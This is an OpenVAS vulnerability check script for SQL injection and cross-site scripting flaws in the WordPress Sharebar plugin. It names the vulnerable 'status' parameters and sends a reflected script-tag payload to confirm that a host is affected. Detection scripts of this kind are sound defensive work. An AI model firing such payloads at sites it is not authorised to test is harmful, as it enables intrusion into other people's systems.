###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_sharebar_plugin_mult_vuln.nasl 11374 2018-09-13 12:45:05Z asteins $
#
# WordPress Sharebar Plugin SQL Injection And XSS Vulnerabilities
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802858");
  script_version("$Revision: 11374 $");
  script_bugtraq_id(53201);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2017-04-26 11:02:50 +0200 (Mi, 26 Apr 2017)$");
  script_tag(name:"creation_date", value:"2012-05-17 13:13:01 +0530 (Thu, 17 May 2012)");
  script_name("WordPress Sharebar Plugin SQL Injection And XSS Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);

  script_xref(name:"URL", value:"http://secunia.com/advisories/48908");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/75064");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/112690/WordPress-Sharebar-1.2.1-SQL-Injection-Cross-Site-Scripting.html");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to cause SQL
  Injection attack and gain sensitive information or insert arbitrary HTML and script code, which
  will be executed in a user's browser session in the context of an affected site.");

  script_tag(name:"affected", value:"WordPress Sharebar version 1.2.3 and prior");

  script_tag(name:"insight", value:"The flaws are due to improper validation of user supplied input to,

  - 'status' parameter to /wp-content/plugins/sharebar/sharebar-admin.php'.

  - 'status' parameter to /wp-admin/options-general.php
  (when 'page' is set to 'Sharebar'), which allows attacker to manipulate
  SQL queries by injecting arbitrary SQL code.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"This host is running WordPress with Sharebar plugin and is prone
  to sql injection and cross site scripting vulnerabilities.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE)) exit(0);
if(!dir = get_app_location(cpe:CPE, port:port)) exit(0);

if(dir == "/") dir = "";
url = dir + '/wp-content/plugins/sharebar/sharebar-admin.php?status=<script>alert(document.cookie)</script>';

if(http_vuln_check(port:port, url:url, check_header:TRUE, pattern:"<script>alert\(document\.cookie\)</script>", extra_check:make_list("Sharebar","wordpress"))){
  report = report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);